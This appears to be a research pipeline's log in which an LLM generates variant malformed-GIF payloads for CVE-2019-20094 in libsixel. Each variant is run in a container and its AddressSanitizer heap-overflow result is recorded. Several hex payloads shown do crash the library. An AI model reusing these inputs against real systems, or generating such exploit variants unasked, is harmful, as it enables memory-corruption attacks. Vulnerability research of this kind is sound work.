+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x77ee42e29e9c is located 0 bytes to the right of 58156700-byte region [0x77ee3f6b3800,0x77ee42e29e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x77ee9c328c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0efe485bd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0efe485bd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x77ee42e29e9c at pc 0x00000054eded bp 0x7ffd71a9a2c0 sp 0x7ffd71a9a2b8
+WRITE of size 1 at 0x77ee42e29e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x77ee9c328c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x77ee42e29e9c is located 0 bytes to the right of 58156700-byte region [0x77ee3f6b3800,0x77ee42e29e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x77ee9c328c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0efe485bd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0efe485bd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0efe485bd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0efe485bd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [8, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edc', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x77ee42e29e9c at pc 0x00000054eded bp 0x7ffd71a9a2c0 sp 0x7ffd71a9a2b8\nWRITE of size 1 at 0x77ee42e29e9c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x77ee9c328c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x77ee42e29e9c is located 0 bytes to the right of 58156700-byte region [0x77ee3f6b3800,0x77ee42e29e9c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x77ee9c328c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0efe485bd380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0efe485bd390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0efe485bd3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0efe485bd3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0efe485bd3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0efe485bd3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0efe485bd3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0efe485bd3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0efe485bd400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0efe485bd410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0efe485bd420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 12:58:33,482 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 12:59:58,663 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1a376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1a376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 12:59:58,664 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P8_org.fig
+2026-01-14 12:59:58,665 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P8.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x74efdb229e9c at pc 0x00000054eded bp 0x7fff207a9e20 sp 0x7fff207a9e18
+WRITE of size 1 at 0x74efdb229e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x74f03473bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x74efdb229e9c is located 0 bytes to the right of 58156700-byte region [0x74efd7ab3800,0x74efdb229e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x74f03473bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0e9e7b63d380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0e9e7b63d3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+=================================================================
+==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x74efdb229e9c at pc 0x00000054eded bp 0x7fff207a9e20 sp 0x7fff207a9e18
+WRITE of size 1 at 0x74efdb229e9c thread T0
+    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38
+    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #6 0x74f03473bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)
+
+0x74efdb229e9c is located 0 bytes to the right of 58156700-byte region [0x74efd7ab3800,0x74efdb229e9c)
+allocated by thread T0 here:
+    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)
+    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42
+    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22
+    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18
+    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18
+    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14
+    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22
+    #7 0x74f03473bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame
+Shadow bytes around the buggy address:
+  0x0e9e7b63d380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0e9e7b63d3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0e9e7b63d3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0e9e7b63d420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==7==ABORTING
+
+
+Crash Detected: True
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [9, 'CVE-2019-20094', 'gif_init_frame', True, 'libsixel-1.8.4', '4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1a376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n =================================================================\n==7==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x74efdb229e9c at pc 0x00000054eded bp 0x7fff207a9e20 sp 0x7fff207a9e18\nWRITE of size 1 at 0x74efdb229e9c thread T0\n    #0 0x54edec in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:250:38\n    #1 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #2 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #3 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #4 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #5 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #6 0x74f03473bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n    #7 0x41a439 in _start (/usr/local/bin/img2sixel+0x41a439)\n\n0x74efdb229e9c is located 0 bytes to the right of 58156700-byte region [0x74efd7ab3800,0x74efdb229e9c)\nallocated by thread T0 here:\n    #0 0x4da2f0 in malloc (/usr/local/bin/img2sixel+0x4da2f0)\n    #1 0x54e305 in gif_init_frame /test/libsixel-1.8.4/src/fromgif.c:239:42\n    #2 0x54cbfb in load_gif /test/libsixel-1.8.4/src/fromgif.c:644:22\n    #3 0x52db76 in load_with_builtin /test/libsixel-1.8.4/src/loader.c:888:18\n    #4 0x52d703 in sixel_helper_load_image_file /test/libsixel-1.8.4/src/loader.c:1392:18\n    #5 0x51850d in sixel_encoder_encode /test/libsixel-1.8.4/src/encoder.c:1737:14\n    #6 0x513f34 in main /test/libsixel-1.8.4/converters/img2sixel.c:457:22\n    #7 0x74f03473bc86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /test/libsixel-1.8.4/src/fromgif.c:250:38 in gif_init_frame\nShadow bytes around the buggy address:\n  0x0e9e7b63d380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e9e7b63d390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e9e7b63d3a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e9e7b63d3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0e9e7b63d3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0e9e7b63d3d0: 00 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e9e7b63d3e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e9e7b63d3f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e9e7b63d400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e9e7b63d410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0e9e7b63d420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==7==ABORTING\n']
+Updated xlsx
+2026-01-14 13:00:44,961 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 13:01:49,516 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c26e4f0300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab7c26e4f0300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 13:01:49,517 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P9_org.fig
+2026-01-14 13:01:49,518 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P9.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+runtime error
+corrupt GIF (reason: unknown code).
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+runtime error
+corrupt GIF (reason: unknown code).
+
+
+Crash Detected: False
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [10, 'CVE-2019-20094', 'gif_init_frame', False, 'libsixel-1.8.4', '4749463839615ab7c26e4f0300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n runtime error\ncorrupt GIF (reason: unknown code).\n']
+Updated xlsx
+2026-01-14 13:02:35,457 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 13:03:27,902 - INFO - Request successful
+Extracted PoC codes: 4749463839615a58b7c278d103000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615a58b7c278d103000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 13:03:27,903 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P10_org.fig
+2026-01-14 13:03:27,904 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P10.fig
+Docker image 'libsixel-new-img' built successfully.
+[INFO] Container 'libsixel-container' is already running.
+Running PoC...
+Generating test traffic...
+[ERROR] Command failed: img2sixel -I test-poc
+runtime error
+corrupt GIF (reason: unknown code).
+
+Waiting for crash detection...
+
+=== libsixel Output ===
+runtime error
+corrupt GIF (reason: unknown code).
+
+
+Crash Detected: False
+Cleaning up...
+Container 'libsixel-container' is running. Stopping it...
+Added new row: [11, 'CVE-2019-20094', 'gif_init_frame', False, 'libsixel-1.8.4', '4749463839615a58b7c278d103000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b', '\n runtime error\ncorrupt GIF (reason: unknown code).\n']
+Updated xlsx
+2026-01-14 13:04:14,285 - INFO - Sending request to Ollama with model: deepseek-r1:70b
+2026-01-14 13:04:51,189 - INFO - Request successful
+Extracted PoC codes: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Cleaned Hex: 4749463839615ab7c278d10300000000dd0907fbf305ffffff21f9040d0a0003002c00000000300030000002fedcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb871e3c68d1b376edcb851a244891a376edcb871e3c68d1b376edcb871e3c68d1b374a942851a2448912256adcb871e3c68d1b376edcb871e3c68d1b254a942851a2448912254ad4b871e3c68d1b376edcb871e3c68d1b
+Written as HEX → binary
+2026-01-14 13:04:51,190 - INFO - [✓] Saved: /home/lamia6158/bigstorage/libsixel_outputs/variants_result/output_our_variant_tool/deepseek/deepseek_poc_variants-our_output/Index_CVE-2019-20094_P11_org.fig
